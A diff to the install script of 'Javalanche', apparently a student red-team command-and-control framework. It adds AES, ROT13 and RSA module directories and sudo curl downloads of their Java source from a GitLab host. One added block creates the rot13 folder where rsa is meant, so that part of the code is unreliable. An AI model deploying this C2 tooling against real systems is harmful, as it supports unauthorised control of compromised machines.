@@ -50,7 +50,18 @@ fi
 if [ ! -d "/home/javalanche/Servers/C2" ]; then
     sudo mkdir /home/javalanche/Servers/C2
 fi
-
+if [ ! -d "/home/javalanche/Servers/encryption" ]; then
+    sudo mkdir /home/javalanche/Servers/encryption
+fi
+if [ ! -d "/home/javalanche/Servers/encryption/aes" ]; then
+    sudo mkdir /home/javalanche/Servers/encryption/aes
+fi
+if [ ! -d "/home/javalanche/Servers/encryption/rot13" ]; then
+    sudo mkdir /home/javalanche/Servers/encryption/rot13
+fi
+if [ ! -d "/home/javalanche/Servers/encryption/rsa" ]; then
+    sudo mkdir /home/javalanche/Servers/encryption/rot13
+fi
 
 # Download all of the java files
 sudo curl -o /home/javalanche/Servers/C2/C2Server.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/C2/C2Server.java?ref_type=heads
@@ -63,6 +74,13 @@ sudo curl -o /home/javalanche/Servers/Beacon/pwnBoardRequest.java https://gitlab
 sudo curl -o /home/javalanche/Servers/Duplexer.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/Duplexer.java?ref_type=heads
 sudo curl -o /home/javalanche/Servers/keepAlive.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/keepAlive.java?ref_type=heads
 sudo curl -o /home/javalanche/Servers/notifyLock.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/notifyLock.java?ref_type=heads
+sudo curl -o /home/javalanche/Servers/encryption/aes/aes.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/encryption/aes/aes.java?ref_type=heads
+sudo curl -o /home/javalanche/Servers/encryption/aes/encryption.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/encryption/aes/encryption.java?ref_type=heads
+sudo curl -o /home/javalanche/Servers/encryption/aes/decryption.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/encryption/aes/decryption.java?ref_type=heads
+sudo curl -o /home/javalanche/Servers/encryption/aes/modes.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/encryption/aes/modes.java?ref_type=heads
+sudo curl -o /home/javalanche/Servers/encryption/aes/keyExpansion.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/encryption/aes/keyExpansion.java?ref_type=heads
+sudo curl -o /home/javalanche/Servers/encryption/rot13/rot13.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/encryption/rot13/rot13.java?ref_type=heads
+sudo curl -o /home/javalanche/Servers/encryption/rsa/rsa.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/encryption/rsa/rsa.java?ref_type=heads
 
 # Download file for javac to use
 sudo curl -o /home/javalanche/files.txt https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Setup/linuxFiles.txt?ref_type=heads
